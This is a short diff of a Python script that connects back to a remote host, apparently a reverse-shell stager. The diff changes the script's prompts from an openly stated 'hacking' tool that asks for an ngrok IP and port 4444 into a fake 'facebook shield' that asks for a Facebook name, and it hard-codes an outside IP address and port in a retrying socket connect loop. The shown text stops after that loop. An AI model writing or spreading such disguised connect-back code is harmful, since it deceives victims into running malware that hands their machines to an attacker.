@@ -1,18 +1,18 @@
 import time
 import socket,struct
 print("tool by Ali PotHead")
-print("hello this tool is for hacking Everything ")
+print("hello this tool is for facebook shield ")
 time.sleep(1)
-print("turn on your ngrok")
+print("turn on your facebook")
 time.sleep(1)
-f = raw_input("your ip: ")
-u = raw_input("the port 4444 is default: ")
+f = raw_input("your facebook name ")
+u = raw_input("do you want the shield (Y/n): ")
 time.sleep(1)
 print("please wait ")
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('105.235.137.226',4444))
+		s.connect(('52.15.183.149',16583))
 		break
 	except:
 		time.sleep(5)
